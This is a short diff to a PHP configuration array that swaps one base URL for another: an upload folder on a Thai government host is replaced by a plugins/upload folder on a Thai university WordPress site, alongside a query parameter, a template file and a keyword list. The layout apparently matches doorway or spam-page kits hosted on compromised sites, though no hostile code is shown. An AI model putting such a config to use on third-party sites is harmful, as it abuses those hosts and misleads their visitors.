@@ -1,6 +1,6 @@
 <?php
 $config = array(
-        'url'		=> 'http://amssspmphrae.sesa37.go.th/amssplus/upload/',
+        'url'		=> 'https://dsd.pcru.ac.th/dsd2018/wp-content/plugins/upload/',
         'parameter' => 'go',
         'template'  => 'temp.html',
         'keywords'  => 'bb.txt',
